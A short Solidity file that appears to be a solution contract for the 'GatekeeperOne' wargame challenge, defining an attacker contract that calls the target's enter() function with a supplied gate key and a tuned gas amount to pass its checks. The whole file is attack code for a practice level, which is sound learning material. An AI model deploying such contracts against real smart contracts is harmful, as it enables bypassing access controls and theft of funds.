pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {

    IGatekeeperOne challenge;

    constructor(address addr) {
        challenge = IGatekeeperOne(addr);
    }

    function attack(bytes8 gateKey, uint256 gasToUse) public {
        require(challenge.enter{gas: gasToUse}(gateKey));
    }

}
